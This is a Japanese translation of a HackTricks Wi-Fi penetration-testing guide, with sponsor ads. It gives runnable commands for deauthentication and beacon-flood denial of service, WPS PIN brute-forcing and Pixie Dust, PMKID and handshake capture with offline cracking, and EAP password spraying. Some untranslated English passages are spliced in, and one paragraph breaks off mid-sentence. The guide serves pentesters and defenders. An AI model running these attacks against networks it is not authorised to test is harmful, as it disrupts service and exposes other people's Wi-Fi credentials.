# Wifiのペントテスト

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## Wifiの基本コマンド
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
EAPHammerは、802.11ネットワークでEAPフレームを悪用するためのツールです。EAPHammerは、EAPフレームを使用してネットワークに接続するクライアントを攻撃し、クライアントの認証情報を取得することができます。EAPHammerは、ネットワークの脆弱性をテストするために使用されることがあります。

EAPHammerを使用するには、次の手順に従ってください。

1. EAPHammerをインストールします。
2. EAPHammerを実行します。
3. ターゲットのネットワークを選択します。
4. EAPHammerが攻撃を開始します。
5. クライアントがネットワークに接続すると、EAPHammerは攻撃を実行します。
6. EAPHammerは、クライアントの認証情報を取得します。

EAPHammerは、ネットワークのセキュリティをテストするための強力なツールです。ただし、EAPHammerを使用する前に、法的および倫理的な制限を理解し、遵守する必要があります。
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
# Airgeddon

Airgeddonは、ワイヤレスネットワークのペネトレーションテストに使用されるオールインワンのツールです。このツールは、さまざまな攻撃手法を使用して、WiFiネットワークの脆弱性をテストすることができます。

Airgeddonは、ワイヤレスネットワークのスキャン、ハンドシェイクのキャプチャ、ハンドシェイクの解析、パスワードのクラックなど、さまざまな機能を提供しています。また、WPSピン攻撃やEvil Twin攻撃など、特定の攻撃手法もサポートしています。

Airgeddonは、シンプルなコマンドラインインターフェースを備えており、ユーザーフレンドリーな操作が可能です。また、多くのワイヤレスカードとドライバをサポートしているため、さまざまな環境で使用することができます。

Airgeddonは、ワイヤレスネットワークのセキュリティをテストするための強力なツールであり、ペネトレーションテスターやセキュリティエンジニアにとって非常に有用です。
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Dockerを使用してairgeddonを実行する**

If you prefer to run airgeddon in a Docker container, you can follow these steps:

1. Install Docker on your system if you haven't already done so.

2. Clone the airgeddon repository from GitHub:

   ```
   git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
   ```

3. Change into the airgeddon directory:

   ```
   cd airgeddon
   ```

4. Build the Docker image:

   ```
   docker build -t airgeddon .
   ```

5. Run the Docker container:

   ```
   docker run -it --net=host --privileged airgeddon
   ```

   Note: The `--net=host` flag is used to allow the container to access the host network, and the `--privileged` flag is used to give the container elevated privileges.

6. Follow the on-screen instructions to use airgeddon within the Docker container.

By running airgeddon in a Docker container, you can ensure that all the necessary dependencies are included and avoid any potential conflicts with your host system.
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Evil Twin、KARMA、およびKnown Beacons攻撃を実行し、その後フィッシングテンプレートを使用してネットワークの実際のパスワードを取得するか、ソーシャルネットワークの資格情報をキャプチャすることができます。
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

このツールは、**WPS/WEP/WPA-PSK** 攻撃を自動化します。以下のことを自動的に行います：

* インターフェースをモニターモードに設定する
* 可能なネットワークをスキャンし、被害者を選択する
* WEP の場合、WEP 攻撃を実行する
* WPA-PSK の場合
* WPS の場合：Pixie Dust 攻撃とブルートフォース攻撃（ブルートフォース攻撃は時間がかかる可能性があるので注意）。ただし、null PIN やデータベース/生成された PIN は試しません。
* AP から PMKID をキャプチャしてクラックを試みる
* AP のクライアントを切断してハンドシェイクをキャプチャしようとする
* PMKID またはハンドシェイクがある場合、top5000 のパスワードを使用してブルートフォース攻撃を試みる

## 攻撃の概要

* **DoS**
* Deauthentication/disassociation -- すべてのクライアントを切断する（または特定の ESSID/クライアント）
* ランダムな偽 AP -- ネットワークを隠し、スキャナーをクラッシュさせる可能性がある
* AP を過負荷にする -- AP を停止させようとする（通常はあまり役に立たない）
* WIDS -- IDS と遊ぶ
* TKIP、EAPOL -- 一部の AP を DoS するための特定の攻撃
* **クラッキング**
* **WEP** のクラック（複数のツールと方法）
* **WPA-PSK**
* **WPS** ピンコードの「ブルートフォース」
* **WPA PMKID** のブルートフォース
* \[DoS +] **WPA ハンドシェイク** のキャプチャ + クラック
* **WPA-MGT**
* **ユーザー名のキャプチャ**
* **ブルートフォース** 認証情報
* **Evil Twin**（DoS あり/なし）
* **Open** Evil Twin \[+ DoS] -- キャプティブポータルの資格情報をキャプチャしたり、LAN 攻撃を実行するために役立ちます
* **WPA-PSK** Evil Twin -- パスワードを知っている場合にネットワーク攻撃に役立ちます
* **WPA-MGT** -- 企業の資格情報をキャプチャするために役立ちます
* **KARMA, MANA**, **Loud MANA**, **Known beacon**
* **+ Open** -- キャプティブポータルの資格情報をキャプチャしたり、LAN 攻撃を実行するために役立ちます
* **+ WPA** -- WPA ハンドシェイクをキャプチャするために役立ちます

## DoS

### 切断パケット

この種の攻撃で最も一般的な方法は、**切断**パケットを使用することです。これらはデバイスをアクセスポイントから切断する責任を持つ「管理」フレームの一種です。これらのパケットを偽造することが、[多くのWi-Fiネットワークをハックする](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/)鍵となります。ネットワークからいつでも任意のクライアントを強制的に切断することができます。これが行われる簡単さは、いくぶん恐ろしく、しばしばクラックのためのハンドシェイクを収集する一環として行われます。

この切断を一時的に利用してハンドシェイクを収集してクラックするだけでなく、これらの切断を続けることもできます。これにより、クライアントはネットワークからの切断パケットを受け取ることになります。これらのフレームは暗号化されていないため、多くのプログラムは管理フレームを利用して、ネットワーク上の1つまたはすべてのデバイスに対して偽造して送信します。\
**[ここ](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)からの説明です。**

**Aireplay-ng を使用した切断**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 は切断を意味します
* 1 は送信する切断パケットの数です（複数送信することも可能です）；0 は連続的に送信します
* \-a 00:14:6C:7E:40:80 はアクセスポイントのMACアドレスです
* \-c 00:0F:B5:34:30:30 は切断するクライアントのMACアドレスです；省略するとブロードキャスト切断が送信されます（常に機能するわけではありません）
* ath0 はインターフェース名です

### 切断パケット

切断パケットは、近くのアクセスポイントからノード（ラップトップや携帯電話などのデバイス）を切断するために使用されるもう一つの管理フレームのタイプです。切断フレームと切断パケットの違いは、主に使用方法です。

不正なデバイスを切断するために、アクセスポイントは切断パケットを送信してデバイスにネットワークから切断されたことを通知します。一方、切断パケットは、アクセスポイントが電源を切ったり、再起動したり、エリアを離れるときに、ノードを切断するために使用されます。

**[ここ](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)からの説明です。**

**この攻撃は、mdk4（モード "d"）で実行できます。**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4によるさらなるDOS攻撃**

**[ここから](https://en.kali.tools/?p=864)**。

**攻撃モードb: ビーコンフラッディング**

クライアントに偽のAPを表示するためにビーコンフレームを送信します。これにより、ネットワークスキャナーやドライバーがクラッシュすることがあります！
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**攻撃モード a: 認証サービス拒否**

範囲内で見つかったすべてのAPに認証フレームを送信します。多くのクライアントがいると、いくつかのAPがフリーズしたりリセットされたりする可能性があります。
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**攻撃モード p: SSIDプロービングとブルートフォース**

APをプローブし、応答をチェックします。SSIDが正しく非表示にされているか、APが送信範囲内にあるかを確認するのに役立ちます。ワードリストを使用して非表示のSSIDの**ブルートフォース**も可能です。

**攻撃モード m: Michael対策の悪用**

ランダムなパケットを送信したり、別のQoSキューに重複パケットを再注入することで、**TKIP AP**でMichael対策を引き起こします。APはその後1分間シャットダウンされるため、これは効果的な**DoS**攻撃です。
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**攻撃モード e: EAPOL スタートとログオフパケットのインジェクション**

**偽のセッション**を使用して、APに**EAPOL**スタートフレームを大量に送信し、APを忙しくさせ、正規のクライアントを処理できないようにします。または、**偽の**EAPOL **ログオフメッセージ**をインジェクションすることで、クライアントをログオフさせます。
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**攻撃モード s: IEEE 802.11s メッシュネットワークへの攻撃**

メッシュネットワークにおけるリンク管理とルーティングに対するさまざまな攻撃。近隣ノードや経路にフラッド攻撃を行い、トラフィックを逸らしたり、ブラックホールを作成します！

**攻撃モード w: WIDS 混乱**

クライアントを複数のWDSノードにクロス接続したり、偽のローグAPに接続させることで、侵入検知および防止システムを混乱させます。
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**攻撃モード f: パケットファズ**

複数のパケットソースと素晴らしい修飾子を備えたシンプルなパケットファズ。注意して使用してください！

### **Airggedon**

_**Airgeddon**_ は、前のコメントで提案された攻撃のほとんどを提供します：

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPSはWi-Fi Protected Setupの略です。これは、ルーターとワイヤレスデバイスの接続をより速く簡単にするためのワイヤレスネットワークセキュリティの標準です。**WPSは、**WPA** Personalまたは**WPA2** Personalセキュリティプロトコルで暗号化されたパスワードを使用しているワイヤレスネットワークにのみ適用されます。WPSは、基本的なツールとスキルを持つハッカーによって簡単にクラックされることができる非推奨のWEPセキュリティを使用しているワイヤレスネットワークでは機能しません。([ここから](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup)引用)

WPSは、ユーザーがネットワークに接続するために8桁のPINを使用しますが、最初の4桁がまずチェックされ、正しい場合には次に2番目の4桁がチェックされます。その後、最初の半分をブルートフォースし、次に2番目の半分をブルートフォースすることが可能です（11000通りの可能性のみ）。

### WPSブルートフォース

このアクションを実行するための2つの主要なツールがあります：ReaverとBully。

* **Reaver**は、WPSに対する堅牢で実用的な攻撃を行うように設計されており、さまざまなアクセスポイントとWPSの実装に対してテストされています。
* **Bully**は、Cで書かれたWPSブルートフォース攻撃の**新しい実装**です。元のreaverコードに比べて、依存関係が少なく、メモリとCPUのパフォーマンスが向上し、エンディアンの処理が正しく行われ、より堅牢なオプションがあります。

この攻撃は、**8桁のWPS PINコードの脆弱性**を利用しています。この問題のため、プロトコルはPINの最初の4桁に関する情報を公開し、最後の桁は**チェックサム**として機能し、WPS APのブルートフォースが容易になります。\
一部のデバイスには、通常、攻撃を繰り返し試みるMACアドレスを**ブロックするブルートフォース保護**が含まれています。その場合、この攻撃の複雑さが増します。PINをテストする間にMACアドレスを**回転**する必要があります。

WPSの有効なコードが見つかった場合、BullyとReaverはそれを使用してネットワークを保護するために使用されるWPA/WPA2 PSKを見つけることができるため、必要な時にいつでも接続することができます。
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**スマートなブルートフォース**

すべての可能なPINを試す代わりに、攻撃対象のAPに利用可能な**PINが発見されているかどうか**（製造元のMACに依存）と、**PINソフトウェアが生成したPIN**をチェックするべきです。

- 既知のPINのデータベースは、特定の製造元のアクセスポイントに対して、同じWPS PINが使用されていることが知られているものです。このデータベースにはMACアドレスの最初の3オクテットと、この製造元に非常に可能性の高い対応するPINのリストが含まれています。
- WPS PINを生成するためのいくつかのアルゴリズムがあります。たとえば、ComputePINとEasyBoxは、アクセスポイントのMACアドレスを計算に使用します。ただし、ArcadyanアルゴリズムではデバイスIDも必要です。

### WPS Pixie Dust攻撃

Dominique Bongardは、一部のAPが**ノンス**（**E-S1**および**E-S2**として知られる）を生成する際に弱い方法を持っていることを発見しました。これらのノンスが何であるかを特定できれば、APのWPS PINを簡単に見つけることができます。なぜなら、APはPINをハッシュで私たちに提供する必要があり、それによってAPもPINを知っていることを証明し、クライアントが偽のAPに接続していないことを確認する必要があるからです。これらのE-S1とE-S2は、WPS PINを含む「ロックボックスを開けるための鍵」と言えます。詳細はこちら：[https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

基本的に、一部の実装では認証通信中にPINが2つの部分に分解され、クライアントに送信される際にランダムなキーを使用することに失敗していたため、オフライン攻撃を使用して有効なPINをブルートフォースすることができました。
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Null Pin攻撃

一部の非常に悪い実装では、Null PINを接続できるようにしてしまっています（非常に奇妙です）。Reaverはこれをテストすることができます（Bullyはできません）。
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

すべての提案されたWPS攻撃は、_**airgeddon**_を使用して簡単に実行できます。

![](<../../.gitbook/assets/image (124).png>)

* 5と6は**カスタムPIN**を試すことができます（もし持っている場合）
* 7と8は**Pixie Dust攻撃**を実行します
* 13は**NULL PIN**をテストすることができます
* 11と12は、利用可能なデータベースから選択したAPに関連するPINを**収集**し、ComputePIN、EasyBox、およびオプションでArcadyan（おすすめ、なぜなら）を使用して可能な**PIN**を**生成**します
* 9と10は**すべての可能なPIN**をテストします

## **WEP**

壊れて消えたので、話すつもりはありません。ただし、_**airgeddon**_にはこの種の保護を攻撃するための「オールインワン」というWEPオプションがあります。他のツールも同様のオプションを提供しています。

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register) ハッキングから収益を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## WPA/WPA2 PSK

### PMKID

2018年、hashcatの作者は[新しいタイプの攻撃](https://hashcat.net/forum/thread-7717.html)を公開しました。この攻撃は**1つのパケット**に依存するだけでなく、攻撃対象のAPにクライアントが接続されていなくても、攻撃者とAPの間の通信だけで行うことができます。

実は、**多くの**モダンなルーターは、誰かが関連付けを行っているときにAP自体が送信する**最初のEAPOL**フレームの末尾に**オプションのフィールド**を追加します。これを「Robust Security Network」と呼び、`PMKID`と呼ばれるものを含んでいます。

元の投稿で説明されているように、**PMKID**は私たちには既知のデータを使用して派生します。
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
**「PMK Name」の文字列が一定であるため、APとステーションのBSSID、および完全な4ウェイハンドシェイクから取得した「PMK」が同じであることがわかっている場合、hashcatはこれだけでPSKをクラックし、パスフレーズを回復することができます！**\
[ここ](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)から取得した説明。

この情報を**収集**し、パスワードをローカルで**ブルートフォース攻撃**するには、次の手順を実行します：
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs**をキャプチャしたものは、**コンソール**に表示され、また**/tmp/attack.pcap**に保存されます。\
次に、キャプチャを**hashcat/john**の形式に変換し、それをクラックします。
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
正しいハッシュの形式は、_4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6e65436f6e6e6563743034383131343838_ のように、**4つの部分**から成ります。

もしハッシュが**3つの部分**しか含まれていない場合、それは**無効**です（PMKIDキャプチャが有効ではありません）。

`hcxdumptool`は**ハンドシェイクもキャプチャ**します（次のようなものが表示されます: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**）。`cap2hccapx`を使用して、**ハンドシェイク**を**hashcat**/**john**の形式に変換することができます。
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_このツールでキャプチャされた一部のハンドシェイクは、正しいパスワードを知っていてもクラックすることができませんでした。可能であれば、従来の方法でもハンドシェイクをキャプチャするか、このツールを使用して複数のハンドシェイクをキャプチャすることをお勧めします。_

### ハンドシェイクのキャプチャ

**WPA/WPA2**ネットワークを攻撃する方法の一つは、**ハンドシェイク**をキャプチャして、オフラインで使用されるパスワードを**クラック**することです。そのためには、**被害者**のネットワークの**BSSID**と**チャンネル**、ネットワークに接続されている**クライアント**を見つける必要があります。\
この情報を手に入れたら、その**BSSID**が使用する**チャンネル**でのすべての通信を**監視**する必要があります。なぜなら、ハンドシェイクがそこに送信されることを期待しているからです。
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
以下の手順で、クライアントを一時的に**認証解除**し、自動的にAPに再度認証させる必要があります（クライアントの認証解除方法については、DoSの部分を読んでください）:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_クライアントが認証解除された場合、別のAPに接続しようとするか、他のネットワークに接続しようとする可能性があることに注意してください。_

`airodump-ng`にハンドシェイク情報が表示されると、ハンドシェイクがキャプチャされたことを意味し、リスニングを停止できます。

![](<../../.gitbook/assets/image (172) (1).png>)

ハンドシェイクがキャプチャされたら、`aircrack-ng`を使用して**解読**できます。
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### ファイル内のハンドシェイクを確認する

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**

tshark is a command-line tool for capturing and analyzing network traffic. It is part of the Wireshark suite and provides similar functionality to Wireshark, but without the graphical user interface (GUI).

tshark can be used to capture packets from a network interface or read packets from a capture file. It supports a wide range of capture filters and display filters to help you focus on specific network traffic.

To capture packets from a network interface, you can use the following command:

```
tshark -i <interface>
```

Replace `<interface>` with the name of the network interface you want to capture packets from, such as `eth0` or `wlan0`.

To read packets from a capture file, you can use the following command:

```
tshark -r <file>
```

Replace `<file>` with the path to the capture file you want to analyze.

tshark can also be used to apply display filters to analyze specific packets. For example, you can use the following command to display only HTTP packets:

```
tshark -r <file> -Y http
```

Replace `<file>` with the path to the capture file you want to analyze.

tshark provides a wide range of options and features for capturing and analyzing network traffic. Refer to the tshark documentation for more information on how to use this powerful tool.
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)は、WPA/WPA2のハンドシェイクキャプチャからパスワードを復号化するためのツールです。このツールは、事前共有キー（PSK）を使用して保護されたWi-Fiネットワークのパスワードをクラックするために使用されます。cowpattyは、辞書攻撃やブルートフォース攻撃などのさまざまな攻撃手法を使用して、パスワードを解読します。このツールは、Wi-Fiネットワークのセキュリティ評価やペネトレーションテストにおいて有用です。
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_このツールは、完了していないESSIDのハンドシェイクを検出した場合、有効なハンドシェイクを検出しません。_

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPAエンタープライズ（MGT）**

**異なる認証方法**について話すことは重要です。企業のWifiでは、おそらく`airodump-ng`で次のようなものが見つかるでしょう。
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
### EAP（拡張認証プロトコル）

**認証通信**の**骨組み**である**EAP**（拡張認証プロトコル）の上に、サーバーは**認証アルゴリズム**を使用して**クライアント**（**サプリカント**）を認証し、一部の場合ではクライアントがサーバーを認証するためにも使用されます。

この場合に使用される主な認証アルゴリズムは次のとおりです：

- **EAP-GTC**：EAP-PEAPでハードウェアトークンとワンタイムパスワードの使用をサポートするためのEAPメソッドです。MSCHAPv2と似た実装ですが、ピアチャレンジは使用しません。代わりに、パスワードは**平文**でアクセスポイントに送信されます（ダウングレード攻撃に非常に興味深い）。
- **EAP-MD-5（メッセージダイジェスト）**：クライアントはパスワードのMD5ハッシュを送信します。**推奨されません**：辞書攻撃に対して脆弱であり、サーバーの認証も行われず、セッションごとの有線同等プライバシー（WEP）キーを生成する方法もありません。
- **EAP-TLS（トランスポート層セキュリティ）**：クライアント側とサーバー側の証明書を使用して認証を行い、後続の通信を保護するためにユーザーベースおよびセッションベースのWEPキーを動的に生成するために使用されます。
- **EAP-TTLS（トンネル化トランスポート層セキュリティ）**：クライアントとネットワークの**相互認証**を暗号化されたチャネル（またはトンネル）を介して行うだけでなく、ユーザーごとのセッションごとのWEPキーを生成する手段も提供します。EAP-TLSとは異なり、**EAP-TTLSはサーバー側の証明書のみが必要です（クライアントは資格情報を使用します）**。
- **PEAP（保護拡張認証プロトコル）**：PEAPは**EAP**プロトコルのようですが、通信を保護するために**TLSトンネル**を作成します。その後、弱い認証プロトコルをEAPの上に使用できます（トンネルによって保護されます）。
- **PEAP-MSCHAPv2**：これは広く採用されているため、**PEAP**とも呼ばれます。これはPEAPの上にある脆弱なチャレンジ/レスポンスであるMSCHAPv2です（TLSトンネルによって保護されます）。
- **PEAP-EAP-TLSまたはPEAP-TLS**：これは**EAP-TLS**に非常に似ていますが、証明書の交換の前にTLSトンネルが作成されます。

これらの認証方法の詳細については、[こちら](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)と[こちら](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html)を参照してください。

### ユーザー名のキャプチャ

[https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27)を読むと、**EAP**を使用している場合、**「Identity」**メッセージが**サポート**される必要があり、**ユーザー名**は**「Response Identity」**メッセージで**クリア**に送信されます。

最も安全な認証方法の1つである**PEAP-EAP-TLS**を使用していても、EAPプロトコルで送信される**ユーザー名をキャプチャ**することができます。これを行うには、認証通信をキャプチャします（チャンネル内で`airodump-ng`を開始し、同じインターフェースで`wireshark`を開始）し、パケットを`eapol`でフィルタリングします。**「Response, Identity」**パケットの中に、クライアントの**ユーザー名**が表示されます。

![](<../../.gitbook/assets/image (150).png>)

### 匿名のアイデンティティ

（情報は[こちら](https://www.interlinknetworks.com/app_notes/eap-peap.htm)から取得）

**EAP-PEAP**および**EAP-TTLS**の両方は、**アイデンティティの非表示**をサポートしています。WiFi環境では、アクセスポイント（AP）は通常、関連付けプロセスの一環としてEAP-Identityリクエストを生成します。匿名性を保持するために、ユーザーのシステム上のEAPクライアントは、リクエストを処理するために十分な情報のみを含む応答を返します。以下の例に示すように。

- _**EAP-Identity = anonymous**_

> この例では、すべてのユーザーが疑似ユーザー名「anonymous」を共有します。最初のホップのRADIUSサーバーはEAP-PEAPまたはEAP-TTLSサーバーであり、PEAPまたはTTLSプロトコルのサーバーエンドを駆動します。内部（保護された）認証タイプは、ローカルで処理されるか、リモート（ホーム）RADIUSサーバーにプロキシされます。

- _**EAP-Identity = anonymous@realm_x**_

> この例では、異なる領域に属するユーザーは自分自身のアイデンティティを隠し、所属する領域を示すだけです。これにより、最初のホップのRADIUSサーバーはユーザーのホーム領域のRADIUSサーバーにEAP-PEAPまたはEAP-TTLSリクエストをプロキシできます。最初のホップサーバーは純粋なRADIUSリレーノードとして機能します。

EAP-PEAPでは、PEAPサーバーとPEAPクライアントがTLSトンネルを確立すると、PEAPサーバーはEAP-Identityリクエストを生成し、TLSトンネルを介してそれを送信します。クライアントは、この2番目のEAP-Identityリクエストに対して、暗号化されたトンネル内にユーザーの真のアイデンティティを含むEAP-Identity応答を送信します。これにより、802.11トラフィックを傍受してもユーザーの真のアイデンティティを発見することはできません。

EAP-TTLSは少し異なる動作をします。EAP-TTLSでは、クライアントは通常、TLSトンネルで保護されたPAPまたはCHAPを介して認証します。この場合、クライアントは、トンネルが確立された後に送信される最初のTLSメッセージにUser-Name属性とPasswordまたはCHAP-Password属性を含めます。

どちらのプロトコルでも、TLSトンネルが確立されると、PEAP/TTLSサーバーはユーザーの真のアイデンティティを学習します。真のアイデンティティは、_**user@realm**_または単に_**user**_の形式である場合があります。PEAP/TTLSサーバーが_**user**_の認証も行っている場合、ユーザーのアイデンティティがわかり、TLSトンネルで保護されている認証方法を続行します。また、PEAP/TTLSサーバーは、ユーザーのホームRADIUSサーバーに新しいRADIUSリクエストを転送することもできます。この新しいRADIUSリクエストには、PEAPまたはTTLSプロトコルが削除されています。保護された認証方法がEAPである場
### EAP-Bruteforce（パスワードスプレー）

クライアントが**ユーザー名とパスワード**を使用することが予想される場合（**EAP-TLSはこの場合有効ではありません**）、次の手順で**ユーザー名**の**リスト**と**パスワード**を取得し、[**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)を使用してアクセスを**ブルートフォース**することができます。
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
あなたは`eaphammer`を使用してもこの攻撃を実行することができます。
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## クライアント攻撃の理論

### ネットワークの選択とローミング

